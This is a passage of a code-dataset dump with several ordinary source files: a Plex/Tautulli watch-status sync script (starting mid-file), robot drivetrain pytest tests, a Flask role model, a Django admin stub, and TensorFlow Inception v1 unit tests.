section_id:\n            payload[\"section_id\"] = section_id\n        if rating_key:\n            payload[\"rating_key\"] = rating_key\n        if start:\n            payload[\"start\"] = start\n        if length:\n            payload[\"lengh\"] = length\n        \n        history = self._call_api('get_history', payload)\n        \n        return [d for d in history['data'] if d['watched_status'] == 1]\n    \n    def get_metadata(self, rating_key):\n        \"\"\"Call Tautulli's get_metadata api endpoint\"\"\"\n        \n        payload = {\"rating_key\": rating_key}\n        return self._call_api('get_metadata', payload)\n    \n    def get_libraries(self):\n        \"\"\"Call Tautulli's get_libraries api endpoint\"\"\"\n        \n        payload = {}\n        return self._call_api('get_libraries', payload)\n\n\nclass Plex:\n    def __init__(self, token, url=None):\n        if token and not url:\n            self.account = MyPlexAccount(token)\n        if token and url:\n            session = Connection().session\n            self.server = PlexServer(baseurl=url, token=token, session=session)\n    \n    def admin_servers(self):\n        \"\"\"All owned servers\n        Returns\n        -------\n        data: dict\n        \"\"\"\n        resources = {}\n        for resource in self.account.resources():\n            if 'server' in [resource.provides] and resource.owned == True:\n                resources[resource.name] = resource\n        \n        return resources\n    \n    def all_users(self):\n        \"\"\"All users\n        Returns\n        -------\n        data: dict\n        \"\"\"\n        users = {self.account.title: self.account}\n        for user in self.account.users():\n            users[user.title] = user\n        \n        return users\n    \n    def all_sections(self):\n        \"\"\"All sections from all owned servers\n        Returns\n        -------\n        data: dict\n        \"\"\"\n        data = {}\n        servers = self.admin_servers()\n        print(\"Connecting to admin server(s) for access info...\")\n        for name, server in servers.items():\n            connect = server.connect()\n            sections = {section.title: section for section in connect.library.sections()}\n            data[name] = sections\n        \n        return data\n    \n    def users_access(self):\n        \"\"\"Users access across all owned servers\n        Returns\n        -------\n        data: dict\n        \"\"\"\n        all_users = self.all_users().values()\n        admin_servers = self.admin_servers()\n        all_sections = self.all_sections()\n        \n        data = {self.account.title: {\"account\": self.account}}\n        \n        for user in all_users:\n            if not data.get(user.title):\n                servers = []\n                for server in user.servers:\n                    if admin_servers.get(server.name):\n                        access = {}\n                        sections = {section.title: section for section in server.sections()\n                                    if section.shared == True}\n                        access['server'] = {server.name: admin_servers.get(server.name)}\n                        access['sections'] = sections\n                        servers += [access]\n                        data[user.title] = {'account': user,\n                                            'access': servers}\n            else:\n                # Admin account\n                servers = []\n                for name, server in admin_servers.items():\n                    access = {}\n                    sections = all_sections.get(name)\n                    access['server'] = {name: server}\n                    access['sections'] = sections\n                    servers += [access]\n                    data[user.title] = {'account': user,\n                                        'access': servers}\n        return data\n\n\ndef connect_to_server(server_obj, user_account):\n    \"\"\"Find server url and connect using user token\n    Parameters\n    ----------\n    server_obj: class\n    user_account: class\n\n    Returns\n    -------\n    user_connection.server: class\n    \"\"\"\n    server_name = server_obj.name\n    user = user_account.title\n    \n    print('Connecting {} to {}...'.format(user, server_name))\n    server_connection = server_obj.connect()\n    baseurl = server_connection._baseurl.split('.')\n    url = \"\".join([baseurl[0].replace('-', '.'),\n                   baseurl[-1].replace('direct', '')])\n    if user_account.title == Plex(PLEX_TOKEN).account.title:\n        token = PLEX_TOKEN\n    else:\n        token = user_account.get_token(server_connection.machineIdentifier)\n    \n    user_connection = Plex(url=url, token=token)\n    \n    return user_connection.server\n\n\ndef check_users_access(access, user, server_name, libraries=None):\n    \"\"\"Check user's access to server. If allowed connect.\n    Parameters\n    ----------\n    access: dict\n    user: dict\n    server_name: str\n    libraries: list\n\n    Returns\n    -------\n    server_connection: class\n    \"\"\"\n    try:\n        _user = access.get(user)\n        for access in _user['access']:\n            server = access.get(\"server\")\n            # Check user access to server\n            if server.get(server_name):\n                server_obj = server.get(server_name)\n                # If syncing by libraries, check library access\n                if libraries:\n                    library_check = any(lib.title in access.get(\"sections\").keys() for lib in libraries)\n                    # Check user access to library\n                    if library_check:\n                        server_connection = connect_to_server(server_obj, _user['account'])\n                        return server_connection\n                    \n                    elif not library_check:\n                        print(\"User does not have access to this library.\")\n                # Not syncing by libraries\n                else:\n                    server_connection = connect_to_server(server_obj, _user['account'])\n                    return server_connection\n            # else:\n            #     print(\"User does not have access to this server: {}.\".format(server_name))\n    except KeyError:\n        print('User name is incorrect.')\n        print(\", \".join(plex_admin.all_users().keys()))\n        exit()\n\n\ndef sync_watch_status(watched, section, accountTo, userTo, same_server=False):\n    \"\"\"\n    Parameters\n    ----------\n    watched: list\n        List of watched items either from Tautulli or Plex\n    section: str\n        Section title of sync from server\n    accountTo: class\n        User's account that will be synced to\n    userTo: str\n        User's server class of sync to user\n    same_server: bool\n        Are serverFrom and serverTo the same\n    \"\"\"\n    print('Marking watched...')\n    sectionTo = accountTo.library.section(section)\n    for item in watched:\n        print(item)\n        try:\n            if same_server:\n                fetch_check = sectionTo.fetchItem(item.ratingKey)\n            else:\n                if item.type == 'episode':\n                    show_name = item.grandparentTitle\n                    show = sectionTo.get(show_name)\n                    watch_check = show.episode(season=int(item.parentIndex), episode=int(item.index))\n                else:\n                    title = item.title\n                    watch_check = sectionTo.get(title)\n                # .get retrieves a partial object\n                # .fetchItem retrieves a full object\n                fetch_check = sectionTo.fetchItem(watch_check.key)\n            # If item is already watched ignore\n            if not fetch_check.isWatched:\n                # todo-me should watched count be synced?\n                fetch_check.markWatched()\n                title = fetch_check._prettyfilename()\n                print(\"Synced watched status of {} to account {}...\".format(title, userTo))\n        \n        except Exception as e:\n            print(e)\n            pass\n\n\nif __name__ == '__main__':\n    parser = argparse.ArgumentParser(description=\"Sync watch status from one user to others.\",\n                                     formatter_class=argparse.RawTextHelpFormatter)\n    parser.add_argument('--libraries', nargs='*', metavar='library',\n                        help='Libraries to scan for watched content.')\n    parser.add_argument('--ratingKey', nargs=\"?\", type=str,\n                        help='Rating key of item whose watch status is to be synced.')\n    requiredNamed = parser.add_argument_group('required named arguments')\n    requiredNamed.add_argument('--userFrom', metavar='user=server', required=True,\n                               type=lambda kv: kv.split(\"=\"), default=[\"\", \"\"],\n                               help='Select user and server to sync from')\n    requiredNamed.add_argument('--userTo', nargs='*', metavar='user=server', required=True,\n                               type=lambda kv: kv.split(\"=\"),\n                               help='Select user and server to sync to.')\n    \n    opts = parser.parse_args()\n    # print(opts)\n    tautulli_server = ''\n    \n    libraries = []\n    all_sections = {}\n    watchedFrom = ''\n    same_server = False\n    count = 25\n    start = 0\n    plex_admin = Plex(PLEX_TOKEN)\n    plex_access = plex_admin.users_access()\n    \n    userFrom, serverFrom = opts.userFrom\n    \n    if serverFrom == \"Tautulli\":\n        # Create a Tautulli instance\n        tautulli_server = Tautulli(Connection(url=TAUTULLI_URL.rstrip('/'),\n                                              apikey=TAUTULLI_APIKEY,\n                                              verify_ssl=VERIFY_SSL))\n    \n    if serverFrom == \"Tautulli\" and opts.libraries:\n        # Pull all libraries from Tautulli\n        _sections = {}\n        tautulli_sections = tautulli_server.get_libraries()\n        for section in tautulli_sections:\n            section_obj = Library(section)\n            _sections[section_obj.title] = section_obj\n        all_sections[serverFrom] = _sections\n    elif serverFrom != \"Tautulli\" and opts.libraries:\n        # Pull all libraries from admin access dict\n        admin_access = plex_access.get(plex_admin.account.title).get(\"access\")\n        for server in admin_access:\n            if server.get(\"server\").get(serverFrom):\n                all_sections[serverFrom] = server.get(\"sections\")\n\n    # Defining libraries\n    if opts.libraries:\n        for library in opts.libraries:\n            if all_sections.get(serverFrom).get(library):\n                libraries.append(all_sections.get(serverFrom).get(library))\n            else:\n                print(\"No matching library name '{}'\".format(library))\n                exit()\n    \n    # If server is Plex and synciing libraries, check access\n    if serverFrom != \"Tautulli\" and libraries:\n        print(\"Checking {}'s access to {}\".format(userFrom, serverFrom))\n        watchedFrom = check_users_access(plex_access, userFrom, serverFrom, libraries)\n    \n    if libraries:\n        print(\"Finding watched items in libraries...\")\n        plexTo = []\n        \n        for user, server_name in opts.userTo:\n            plexTo.append([user, check_users_access(plex_access, user, server_name, libraries)])\n        \n        for _library in libraries:\n            watched_lst = []\n            print(\"Checking {}'s library: '{}' watch statuses...\".format(userFrom, _library.title))\n            if tautulli_server:\n                while True:\n                    # Getting all watched history for userFrom\n                    tt_watched = tautulli_server.get_watched_history(user=userFrom, section_id=_library.key,\n                                                                     start=start, length=count)\n                    if all([tt_watched]):\n                        start += count\n                        for item in tt_watched:\n                            watched_lst.append(Metadata(item))\n                        continue\n                    elif not all([tt_watched]):\n                        break\n                    start += count\n            else:\n                # Check library for watched items\n                sectionFrom = watchedFrom.library.section(_library.title)\n                if _library.type == 'show':\n                    for show in sectionFrom.all():\n                        for episode in show.episodes():\n                            if episode.isWatched:\n                                watched_lst.append(episode)\n                else:\n                    for item in sectionFrom.search(unwatched=False):\n                        watched_lst.append(item)\n            \n            for user in plexTo:\n                username, server = user\n                if server == serverFrom:\n                    same_server = True\n                sync_watch_status(watched_lst, _library.title, server, username, same_server)\n\n    elif opts.ratingKey and serverFrom == \"Tautulli\":\n        plexTo = []\n        watched_item = []\n        \n        if userFrom != \"Tautulli\":\n            print(\"Request manually triggered to update watch status\")\n            tt_watched = tautulli_server.get_watched_history(user=userFrom, rating_key=opts.ratingKey)\n            if tt_watched:\n                watched_item = Metadata(tautulli_server.get_metadata(opts.ratingKey))\n            else:\n                print(\"Rating Key {} was not reported as watched in Tautulli for user {}\".format(opts.ratingKey, userFrom))\n                exit()\n                \n        elif userFrom == \"Tautulli\":\n            print(\"Request from Tautulli notification agent to update watch status\")\n            watched_item = Metadata(tautulli_server.get_metadata(opts.ratingKey))\n    \n        for user, server_name in opts.userTo:\n            # Check access and connect\n            plexTo.append([user, check_users_access(plex_access, user, server_name, libraries)])\n    \n        for user in plexTo:\n            username, server = user\n            sync_watch_status([watched_item], watched_item.libraryName, server, username)\n        \n    else:\n        print(\"You aren't using this script correctly... bye!\")"}
{"blob_id": "41c592c97013e656edc39d7e1f6264fda94911e9", "directory_id": "a0265d00d345eb6a18f451f8435524d252fc1130", "path": "/tests/test_turn_degrees.py", "content_id": "85f08480ac009a24c4ca8f4c6437dc9e46a01c86", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "TechnoJays/robot2017", "snapshot_id": "2570190f7f0432c33781f25cdb2a640830c09e45", "revision_id": "bb8ce82b955f8ee3fc1ac439dc7bb10e8b75996c", "branch_name": "refs/heads/develop", "visit_date": "2021-01-11 16:47:35.737953", "revision_date": "2017-03-22 18:35:13", "committer_date": "2017-03-22 18:35:13", "github_id": "79672126", "star_events_count": "2", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2017-02-16 23:58:35", "gha_created_at": "2017-01-21 20:51:53", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "5013", "extension": "py", "content": "import pytest\nfrom commands.turn_degrees import TurnDegrees\nfrom subsystems.drivetrain import Drivetrain\n\n\n\"\"\"\nhal_data['pwm'] looks like this:\n[{\n    'zero_latch': False,\n    'initialized': False,\n    'raw_value': 0,\n    'value': 0,\n    'period_scale': None,\n    'type': None\n}, {\n    'zero_latch': True,\n    'initialized': True,\n    'raw_value': 1011,\n    'value': 0.0,\n    'period_scale': 0,\n    'type': 'talon'\n},...]\n\"\"\"\n\n\n@pytest.fixture(scope=\"function\")\ndef drivetrain_default(robot):\n    return Drivetrain(robot, None, '../tests/test_configs/drivetrain_default.ini')\n\n\n@pytest.fixture(scope=\"function\")\ndef command_default(robot, drivetrain_default):\n    robot.drivetrain = drivetrain_default\n    return TurnDegrees(robot, 90.0, 1.0, 2.0, None, 15)\n\n\ndef update_gyro(hal_data, command):\n    current = hal_data['analog_gyro'][1]['angle']\n    degrees_left = command._target_degrees - current\n    if degrees_left >= 0:\n        hal_data['analog_gyro'][1]['angle'] += 1.0\n    else:\n        hal_data['analog_gyro'][1]['angle'] -= 1.0\n\n\ndef isclose(a, b, rel_tol=0.1, abs_tol=0.0):\n    return abs(a-b) <= max(rel_tol * max(abs(a), abs(b)), abs_tol)\n\n\ndef test_init_default(command_default):\n    assert command_default is not None\n    assert command_default.robot is not None\n    assert command_default.robot.drivetrain is not None\n    assert command_default.name == \"TurnDegrees\"\n    assert command_default.timeout == 15\n    assert command_default._speed == 1.0\n    assert command_default._degrees_change == 90.0\n    assert command_default._degree_threshold == 2.0\n\n\ndef test_init_full(robot, drivetrain_default):\n    robot.drivetrain = drivetrain_default\n    td = TurnDegrees(robot, -30.0, 0.5, 5.0, \"CustomTurnDegrees\", 5)\n    assert td is not None\n    assert td.robot is not None\n    assert td.robot.drivetrain is not None\n    assert td.name == \"CustomTurnDegrees\"\n    assert td.timeout == 5\n    assert td._speed == 0.5\n    assert td._degrees_change == -30.0\n    assert td._degree_threshold == 5.0\n\n\ndef test_initialize(command_default):\n    command_default.initialize()\n    assert command_default._target_degrees == 90\n\n\n@pytest.mark.parametrize(\"initial_angle,target_angle,threshold,speed,left_ex_speed,right_ex_speed\", [\n    (0.0, 0.0, 1.0, 1.0, -1.0, -1.0),\n    (10.0, 30.0, 2.0, 1.0, -1.0, -1.0),\n    (20.0, 60.0, 5.0, 0.5, -0.5, -0.5),\n    (20.0, -60.0, 10.0, 1.0, 1.0, 1.0),\n    (10.0, -30.0, 2.0, 0.5, 0.5, 0.5),\n])\ndef test_execute(robot, drivetrain_default, hal_data, initial_angle, target_angle, threshold, speed,\n                 left_ex_speed, right_ex_speed):\n    robot.drivetrain = drivetrain_default\n    td = TurnDegrees(robot, target_angle, speed, threshold, \"CustomTurnDegrees\", 15)\n    assert td is not None\n    hal_data['analog_gyro'][1]['angle'] = initial_angle\n    td.initialize()\n    td.execute()\n    assert hal_data['pwm'][1]['value'] == left_ex_speed\n    assert hal_data['pwm'][2]['value'] == right_ex_speed\n\n\n# TODO: Figure out how the new ADXRS450_Gyro is handled in hal_data\n# @pytest.mark.parametrize(\"initial_angle,target_angle,threshold,fake_angle,finished\", [\n#     (0.0, 0.0, 1.0, 0.0, True),\n#     (10.0, 30.0, 2.0, 37.0, False),\n#     (20.0, 60.0, 5.0, 76.0, True),\n#     (20.0, -60.0, 10.0, -20.0, False),\n#     (10.0, -30.0, 2.0, -21.0, True),\n# ])\n# def test_is_finished(robot, drivetrain_default, hal_data, initial_angle, target_angle, threshold, fake_angle, finished):\n#     robot.drivetrain = drivetrain_default\n#     td = TurnDegrees(robot, target_angle, 1.0, threshold, \"CustomTurnDegrees\", 15)\n#     assert td is not None\n#     hal_data['analog_gyro'][1]['angle'] = initial_angle\n#     td.initialize()\n#     hal_data['analog_gyro'][1]['angle'] = fake_angle\n#     assert td.isFinished() is finished\n\n\ndef test_interrupted(command_default):\n    pass  # interrupted method is empty\n\n\ndef test_end(command_default, hal_data):\n    assert hal_data['pwm'][1]['value'] == 0.0\n    assert hal_data['pwm'][2]['value'] == 0.0\n\n\n# @pytest.mark.parametrize(\"initial_angle,target_angle,threshold,speed,left_ex_speed,right_ex_speed\", [\n#     (0.0, 0.0, 1.0, 1.0, 0.0, 0.0),\n#     (10.0, 30.0, 2.0, 1.0, -1.0, -1.0),\n#     (20.0, 60.0, 5.0, 0.5, -0.5, -0.5),\n#     (20.0, -60.0, 10.0, 1.0, 1.0, 1.0),\n#     (10.0, -30.0, 2.0, 0.5, 0.5, 0.5),\n# ])\n# def test_command_full(robot, drivetrain_default, hal_data, initial_angle, target_angle, threshold, speed,\n#                       left_ex_speed, right_ex_speed):\n#     robot.drivetrain = drivetrain_default\n#     td = TurnDegrees(robot, target_angle, speed, threshold, \"CustomTurnDegrees\", 15)\n#     assert td is not None\n#     hal_data['analog_gyro'][1]['angle'] = initial_angle\n#     td.initialize()\n#     while not td.isFinished():\n#         td.execute()\n#         update_gyro(hal_data, td)\n#         assert hal_data['pwm'][1]['value'] == left_ex_speed\n#         assert hal_data['pwm'][2]['value'] == right_ex_speed\n#     td.end()\n#     assert isclose(hal_data['analog_gyro'][1]['angle'], initial_angle + target_angle, threshold)\n"}
{"blob_id": "52cf6b67d4de6d33ed8a81e214cce30f5827cdfb", "directory_id": "a548963bb8151e7aef2c0abc78b6e712acebc4d7", "path": "/roles/models/User/Support_Role.py", "content_id": "863cc8469771aa4c3367d380e0fd307c00a82402", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "TaleG/Flask-Role", "snapshot_id": "de143e24eff917a00944aa505d0bddedd485fc94", "revision_id": "450a64dab95800d4d78c910c45cf394c6e2982d6", "branch_name": "refs/heads/master", "visit_date": "2023-01-13 01:36:19.368151", "revision_date": "2020-01-19 08:18:37", "committer_date": "2020-01-19 08:18:37", "github_id": "202712398", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2022-12-27 15:34:42", "gha_created_at": "2019-08-16 11:00:16", "gha_language": "Python", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "763", "extension": "py", "content": "#!/usr/bin/env python\n#_*_ coding:utf-8 _*_\nfrom roles import db\n\nclass Support_Role_Models(db.Model):\n    \"\"\"Role List\"\"\"\n    __tablename__ = \"support_role\"\n\n    id = db.Column(db.Integer, primary_key=True)\n    roleName = db.Column(db.String(32), unique=True, nullable=False)\n    roleDesc = db.Column(db.String(128))\n    roleList1 = db.relationship(\"SUP_Permission_Role_Models\",\n                               backref='support_role', lazy='dynamic')\n    roleList2 = db.relationship(\"SUP_User_Role_Models\",\n                               backref='support_role', lazy='dynamic')\n\n    def to_json(self):\n        json_data = {\n            \"id\": self.id,\n            \"roleName\": self.roleName,\n            \"roleDesc\": self.roleDesc,\n        }\n        return json_data"}
{"blob_id": "24f95762fdadae5657a0e6ba3487e518af46506a", "directory_id": "4b9f4f876f0f58a9d8a70f3bcb6d6901c1c64e76", "path": "/award/admin.py", "content_id": "9750a925f592c6d58960831a595a639b1df47218", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "kostet19940308/technotrack-web2-spring-2017", "snapshot_id": "220e513bd415286e7a579426fa0bf9193bb13d27", "revision_id": "684cfa41819673f9dcff9048ddc0e2479b4919ac", "branch_name": "refs/heads/master", "visit_date": "2020-04-05 05:06:37.410793", "revision_date": "2017-10-05 11:12:07", "committer_date": "2017-10-05 11:12:07", "github_id": "81922966", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2017-02-14 08:29:06", "gha_created_at": "2017-02-14 08:29:06", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "158", "extension": "py", "content": "\nfrom django.contrib import admin\n\nfrom .models import Award\n# Register your models here.\n\n@admin.register(Award)\nclass AwardAdmin(admin.ModelAdmin):\n    pass"}
{"blob_id": "10d66ae95a49a57d1ded29abdde74392f597141b", "directory_id": "76277f2b37ee94b29a670eeaf902efeaa6ff175e", "path": "/research/slim/nets/inception_v1_test.py", "content_id": "f0db52fdf16311c3dbba6d22ea275d193c7e5633", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "7u5/aiface-tf2", "snapshot_id": "931d078d0e157979bbd92c5405eadc675d19cb8d", "revision_id": "31607adef13549cc7a78c509997a43435fed547c", "branch_name": "refs/heads/master", "visit_date": "2022-12-15 13:52:13.429392", "revision_date": "2020-09-18 08:28:31", "committer_date": "2020-09-18 08:28:31", "github_id": "295146752", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "11143", "extension": "py", "content": "# Copyright 2016 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\"\"\"Tests for nets.inception_v1.\"\"\"\n\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\n\nimport numpy as np\nimport tensorflow.compat.v1 as tf\ntf.disable_v2_behavior()\n\nfrom nets import inception\n\nimport tf_slim as slim\n\n\nclass InceptionV1Test(tf.test.TestCase):\n\n  def testBuildClassificationNetwork(self):\n    batch_size = 5\n    height, width = 224, 224\n    num_classes = 1000\n\n    inputs = tf.random_uniform((batch_size, height, width, 3))\n    logits, end_points = inception.inception_v1(inputs, num_classes)\n    self.assertTrue(logits.op.name.startswith(\n        'InceptionV1/Logits/SpatialSqueeze'))\n    self.assertListEqual(logits.get_shape().as_list(),\n                         [batch_size, num_classes])\n    self.assertTrue('Predictions' in end_points)\n    self.assertListEqual(end_points['Predictions'].get_shape().as_list(),\n                         [batch_size, num_classes])\n\n  def testBuildPreLogitsNetwork(self):\n    batch_size = 5\n    height, width = 224, 224\n    num_classes = None\n\n    inputs = tf.random_uniform((batch_size, height, width, 3))\n    net, end_points = inception.inception_v1(inputs, num_classes)\n    self.assertTrue(net.op.name.startswith('InceptionV1/Logits/AvgPool'))\n    self.assertListEqual(net.get_shape().as_list(), [batch_size, 1, 1, 1024])\n    self.assertFalse('Logits' in end_points)\n    self.assertFalse('Predictions' in end_points)\n\n  def testBuildBaseNetwork(self):\n    batch_size = 5\n    height, width = 224, 224\n\n    inputs = tf.random_uniform((batch_size, height, width, 3))\n    mixed_6c, end_points = inception.inception_v1_base(inputs)\n    self.assertTrue(mixed_6c.op.name.startswith('InceptionV1/Mixed_5c'))\n    self.assertListEqual(mixed_6c.get_shape().as_list(),\n                         [batch_size, 7, 7, 1024])\n    expected_endpoints = ['Conv2d_1a_7x7', 'MaxPool_2a_3x3', 'Conv2d_2b_1x1',\n                          'Conv2d_2c_3x3', 'MaxPool_3a_3x3', 'Mixed_3b',\n                          'Mixed_3c', 'MaxPool_4a_3x3', 'Mixed_4b', 'Mixed_4c',\n                          'Mixed_4d', 'Mixed_4e', 'Mixed_4f', 'MaxPool_5a_2x2',\n                          'Mixed_5b', 'Mixed_5c']\n    self.assertItemsEqual(end_points.keys(), expected_endpoints)\n\n  def testBuildOnlyUptoFinalEndpoint(self):\n    batch_size = 5\n    height, width = 224, 224\n    endpoints = ['Conv2d_1a_7x7', 'MaxPool_2a_3x3', 'Conv2d_2b_1x1',\n                 'Conv2d_2c_3x3', 'MaxPool_3a_3x3', 'Mixed_3b', 'Mixed_3c',\n                 'MaxPool_4a_3x3', 'Mixed_4b', 'Mixed_4c', 'Mixed_4d',\n                 'Mixed_4e', 'Mixed_4f', 'MaxPool_5a_2x2', 'Mixed_5b',\n                 'Mixed_5c']\n    for index, endpoint in enumerate(endpoints):\n      with tf.Graph().as_default():\n        inputs = tf.random_uniform((batch_size, height, width, 3))\n        out_tensor, end_points = inception.inception_v1_base(\n            inputs, final_endpoint=endpoint)\n        self.assertTrue(out_tensor.op.name.startswith(\n            'InceptionV1/' + endpoint))\n        self.assertItemsEqual(endpoints[:index+1], end_points.keys())\n\n  def testBuildAndCheckAllEndPointsUptoMixed5c(self):\n    batch_size = 5\n    height, width = 224, 224\n\n    inputs = tf.random_uniform((batch_size, height, width, 3))\n    _, end_points = inception.inception_v1_base(inputs,\n                                                final_endpoint='Mixed_5c')\n    endpoints_shapes = {'Conv2d_1a_7x7': [5, 112, 112, 64],\n                        'MaxPool_2a_3x3': [5, 56, 56, 64],\n                        'Conv2d_2b_1x1': [5, 56, 56, 64],\n                        'Conv2d_2c_3x3': [5, 56, 56, 192],\n                        'MaxPool_3a_3x3': [5, 28, 28, 192],\n                        'Mixed_3b': [5, 28, 28, 256],\n                        'Mixed_3c': [5, 28, 28, 480],\n                        'MaxPool_4a_3x3': [5, 14, 14, 480],\n                        'Mixed_4b': [5, 14, 14, 512],\n                        'Mixed_4c': [5, 14, 14, 512],\n                        'Mixed_4d': [5, 14, 14, 512],\n                        'Mixed_4e': [5, 14, 14, 528],\n                        'Mixed_4f': [5, 14, 14, 832],\n                        'MaxPool_5a_2x2': [5, 7, 7, 832],\n                        'Mixed_5b': [5, 7, 7, 832],\n                        'Mixed_5c': [5, 7, 7, 1024]}\n\n    self.assertItemsEqual(endpoints_shapes.keys(), end_points.keys())\n    for endpoint_name in endpoints_shapes:\n      expected_shape = endpoints_shapes[endpoint_name]\n      self.assertTrue(endpoint_name in end_points)\n      self.assertListEqual(end_points[endpoint_name].get_shape().as_list(),\n                           expected_shape)\n\n  def testModelHasExpectedNumberOfParameters(self):\n    batch_size = 5\n    height, width = 224, 224\n    inputs = tf.random_uniform((batch_size, height, width, 3))\n    with slim.arg_scope(inception.inception_v1_arg_scope()):\n      inception.inception_v1_base(inputs)\n    total_params, _ = slim.model_analyzer.analyze_vars(\n        slim.get_model_variables())\n    self.assertAlmostEqual(5607184, total_params)\n\n  def testHalfSizeImages(self):\n    batch_size = 5\n    height, width = 112, 112\n\n    inputs = tf.random_uniform((batch_size, height, width, 3))\n    mixed_5c, _ = inception.inception_v1_base(inputs)\n    self.assertTrue(mixed_5c.op.name.startswith('InceptionV1/Mixed_5c'))\n    self.assertListEqual(mixed_5c.get_shape().as_list(),\n                         [batch_size, 4, 4, 1024])\n\n  def testUnknownImageShape(self):\n    tf.reset_default_graph()\n    batch_size = 2\n    height, width = 224, 224\n    num_classes = 1000\n    input_np = np.random.uniform(0, 1, (batch_size, height, width, 3))\n    with self.test_session() as sess:\n      inputs = tf.placeholder(tf.float32, shape=(batch_size, None, None, 3))\n      logits, end_points = inception.inception_v1(inputs, num_classes)\n      self.assertTrue(logits.op.name.startswith('InceptionV1/Logits'))\n      self.assertListEqual(logits.get_shape().as_list(),\n                           [batch_size, num_classes])\n      pre_pool = end_points['Mixed_5c']\n      feed_dict = {inputs: input_np}\n      tf.global_variables_initializer().run()\n      pre_pool_out = sess.run(pre_pool, feed_dict=feed_dict)\n      self.assertListEqual(list(pre_pool_out.shape), [batch_size, 7, 7, 1024])\n\n  def testGlobalPoolUnknownImageShape(self):\n    tf.reset_default_graph()\n    batch_size = 1\n    height, width = 250, 300\n    num_classes = 1000\n    input_np = np.random.uniform(0, 1, (batch_size, height, width, 3))\n    with self.test_session() as sess:\n      inputs = tf.placeholder(tf.float32, shape=(batch_size, None, None, 3))\n      logits, end_points = inception.inception_v1(inputs, num_classes,\n                                                  global_pool=True)\n      self.assertTrue(logits.op.name.startswith('InceptionV1/Logits'))\n      self.assertListEqual(logits.get_shape().as_list(),\n                           [batch_size, num_classes])\n      pre_pool = end_points['Mixed_5c']\n      feed_dict = {inputs: input_np}\n      tf.global_variables_initializer().run()\n      pre_pool_out = sess.run(pre_pool, feed_dict=feed_dict)\n      self.assertListEqual(list(pre_pool_out.shape), [batch_size, 8, 10, 1024])\n\n  def testUnknowBatchSize(self):\n    batch_size = 1\n    height, width = 224, 224\n    num_classes = 1000\n\n    inputs = tf.placeholder(tf.float32, (None, height, width, 3))\n    logits, _ = inception.inception_v1(inputs, num_classes)\n    self.assertTrue(logits.op.name.startswith('InceptionV1/Logits'))\n    self.assertListEqual(logits.get_shape().as_list(),\n                         [None, num_classes])\n    images = tf.random_uniform((batch_size, height, width, 3))\n\n    with self.test_session() as sess:\n      sess.run(tf.global_variables_initializer())\n      output = sess.run(logits, {inputs: images.eval()})\n      self.assertEquals(output.shape, (batch_size, num_classes))\n\n  def testEvaluation(self):\n    batch_size = 2\n    height, width = 224, 224\n    num_classes = 1000\n\n    eval_inputs = tf.random_uniform((batch_size, height, width, 3))\n    logits, _ = inception.inception_v1(eval_inputs, num_classes,\n                                       is_training=False)\n    predictions = tf.argmax(logits, 1)\n\n    with self.test_session() as sess:\n      sess.run(tf.global_variables_initializer())\n      output = sess.run(predictions)\n      self.assertEquals(output.shape, (batch_size,))\n\n  def testTrainEvalWithReuse(self):\n    train_batch_size = 5\n    eval_batch_size = 2\n    height, width = 224, 224\n    num_classes = 1000\n\n    train_inputs = tf.random_uniform((train_batch_size, height, width, 3))\n    inception.inception_v1(train_inputs, num_classes)\n    eval_inputs = tf.random_uniform((eval_batch_size, height, width, 3))\n    logits, _ = inception.inception_v1(eval_inputs, num_classes, reuse=True)\n    predictions = tf.argmax(logits, 1)\n\n    with self.test_session() as sess:\n      sess.run(tf.global_variables_initializer())\n      output = sess.run(predictions)\n      self.assertEquals(output.shape, (eval_batch_size,))\n\n  def testLogitsNotSqueezed(self):\n    num_classes = 25\n    images = tf.random_uniform([1, 224, 224, 3])\n    logits, _ = inception.inception_v1(images,\n                                       num_classes=num_classes,\n                                       spatial_squeeze=False)\n\n    with self.test_session() as sess:\n      tf.global_variables_initializer().run()\n      logits_out = sess.run(logits)\n      self.assertListEqual(list(logits_out.shape), [1, 1, 1, num_classes])\n\n  def testNoBatchNormScaleByDefault(self):\n    height, width = 224, 224\n    num_classes = 1000\n    inputs = tf.placeholder(tf.float32, (1, height, width, 3))\n    with slim.arg_scope(inception.inception_v1_arg_scope()):\n      inception.inception_v1(inputs, num_classes, is_training=False)\n\n    self.assertEqual(tf.global_variables('.*/BatchNorm/gamma:0$'), [])\n\n  def testBatchNormScale(self):\n    height, width = 224, 224\n    num_classes = 1000\n    inputs = tf.placeholder(tf.float32, (1, height, width, 3))\n    with slim.arg_scope(\n        inception.inception_v1_arg_scope(batch_norm_scale=True)):\n      inception.inception_v1(inputs, num_classes, is_training=False)\n\n    gamma_names = set(\n        v.op.name for v in tf.global_variables('.*/BatchNorm/gamma:0$'))\n    self.assertGreater(len(gamma_names), 0)\n    for v in tf.global_variables('.*/BatchNorm/moving_mean:0$'):\n      self.assertIn(v.op.name[:-len('moving_mean')] + 'gamma', gamma_names)\n\n\nif __name__ == '__main__':\n  tf.test.main()\n"}
